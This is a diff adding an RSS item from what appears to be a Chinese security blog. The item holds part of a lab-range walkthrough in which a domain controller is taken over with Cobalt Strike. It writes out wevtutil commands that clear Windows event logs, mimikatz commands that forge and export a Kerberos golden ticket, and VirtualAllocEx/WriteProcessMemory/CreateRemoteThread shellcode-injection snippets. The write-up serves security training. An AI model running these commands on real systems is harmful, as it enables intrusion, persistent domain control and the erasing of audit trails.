+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;选择一下监听器和会话，监听器是刚刚的smb监听，会话是我们的web服务器会话。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.39.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后就可以去等待域控上线了。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.40.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;另一台机器也是一样的上线就行了。记得清除痕迹。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shell wevtutil cl security    //清理安全日志
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shell wevtutil cl system        //清理系统日志
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shell wevtutil cl application        //清理应用程序日志
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shell wevtutil cl &amp;#34;windows powershell&amp;#34;    //清除power shell日志
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shell wevtutil cl Setup     //清除（cl）事件日志中的 &amp;#34;Setup&amp;#34; 事件。
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.41.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;OK，拿下域环境。但是还有一个后续没打完，这里我们没清除痕迹，靶场后续再清吧，我们先生成一下黄金票据。&lt;/p&gt;
+&lt;h1 id=&#34;黄金票据&#34;&gt;黄金票据
+&lt;/h1&gt;&lt;p&gt;我们首先先来获取一下需要的东西，大体上就是需要用户名，域名，SID，哈希值。
+我们接下来一个一个查。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.42.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;用户名：Adminstrator。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.43.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;域名：god.org。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.44.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;SID：s-1-5-10。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.45.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;哈希值这里不用复制，CS会自己提取出来。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.46.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;在刚刚的提取哈希值的同一目录下，有一个黄金票据，直接点开，然后将设置输入进去，我们就可以去生成黄金票据了。然后我们用&lt;code&gt;run klist&lt;/code&gt;验证一下。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.47.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以看到已经生成好了，没什么毛病啊。然后我们就生成下来，再下载下来就OK了。这里随便cd到了C目录。然后打命令。&lt;code&gt;mimikatz kerberos::list /export&lt;/code&gt;
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.48.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;OK，生成好了。
+我们可以检查一下。&lt;code&gt;shell dir C:\*.kirbi&lt;/code&gt;，确定有没有，有了之后就可以去下载票据了。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.49.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;OK，直接打CS的命令就可以下载。&lt;code&gt;download 文件名&lt;/code&gt; ，会下载到kali上面的Server的downloads文件夹下。我们复制一下就行。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.50.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;OK，完事。&lt;/p&gt;
+&lt;h1 id=&#34;知识点解析&#34;&gt;知识点解析
+&lt;/h1&gt;&lt;h2 id=&#34;黄金票据-1&#34;&gt;黄金票据
+&lt;/h2&gt;&lt;p&gt;打了这么多命令，但是其实不是很清楚黄金票据是什么东西，简单来说就是一个永久的身份信息，当年控制了别的内网主机，或者说之前那个断掉了，你用一台新的内网主机，还是可以通过这个票据，登录成域控&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cobol&#34; data-lang=&#34;cobol&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;mimika&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;tz&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;kerberos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;ptt&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;40&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;e00000-Adminstrator&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;krbtgt&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;god&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;org-god&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;org&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;kirbi&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;哈希码横向移动&#34;&gt;哈希码横向移动
+&lt;/h2&gt;&lt;p&gt;前面我们是使用了一个方式直接去抓到明文密码的，但是原理没有介绍，这里介绍一下。
+实际上就是运用了哈希码横向移动，是什么意思呢。其实是一个残留。简单来说就是域控登录过我们当前的这台机子，有一个残留的登录凭证，通过这个登录凭证，我们可以直接登录到域控里面，上传木马，然后拿到域控服务器，进而控制的整个域。下面是一个流程图。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.51.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这就是CS的获取密码到上线后门的一个操作过程。&lt;/p&gt;
+&lt;h2 id=&#34;inject操作&#34;&gt;inject操作
+&lt;/h2&gt;&lt;p&gt;还记得我们前面做权限维持的时候，我们通过inject操作去对一个exe文件注入了木马，但是具体操作是怎么样的，我们探究一下。
+具体流程其实是开辟内存去注入木马进去的，我们来看看流程。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| 正常代码 (exe)    |
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| 正常数据          |
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| 正常堆/栈         |
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这个是正常情况下的exe进程。我们使用OpenProcess 打开目标进程，获得读写权限，然后使用VirtualAllocEx 在目标进程开辟内存。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;LPVOID pRemoteMem = VirtualAllocEx(
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    hProcess,      // 目标进程
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    NULL,          // 系统自动分配地址
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    大小,          // ShellCode 长度
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    MEM_COMMIT | MEM_RESERVE,  // 提交内存
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    PAGE_EXECUTE_READWRITE      // 权限：可读、可写、可执行
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后我们的内存空间就会变化为下面这样。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| 正常代码          |
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| 正常数据          |
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|                   |
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| 【新开辟的内存页】 ← 这是给木马准备的
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| 权限：RWX          ← 关键！可写可执行
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后我们现在就使用WriteProcessMemory 把木马写入内存。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;WriteProcessMemory(
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    hProcess,
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    pRemoteMem,    // 目标内存地址
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ShellCode,     // 木马数据
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    长度,
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    NULL
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后就变成这样。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| 正常代码
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| 正常数据
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| 【木马 ShellCode】 ← 已经写进去了！
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| （二进制机器码）
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后我们还要控制一下进程。使用CreateRemoteThread 让木马在内存里执行。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CreateRemoteThread(
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    hProcess,
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    NULL,
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    0,
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    (LPTHREAD_START_ROUTINE)pRemoteMem, // 入口 = 木马地址
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    NULL,
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    0,
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    NULL
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;最终的内存状态。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+---------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| 正常 exe 代码
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| 正常数据
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| 【木马正在运行中】 ← 独立线程
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| 与 exe 并行执行
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+---------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后就成功注入了，再底层的就是一些二进制数据了，暂时不用了解那么多。&lt;/p&gt;
+&lt;p&gt;借鉴链接：https://blog.csdn.net/mc11451419198/article/details/150070176&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>恶意so加载(花活)</title>
         <link>https://xxxxctfer.github.io/p/%E6%81%B6%E6%84%8Fso%E5%8A%A0%E8%BD%BD%E8%8A%B1%E6%B4%BB/</link>
         <pubDate>Wed, 11 Mar 2026 00:00:00 +0000</pubDate>
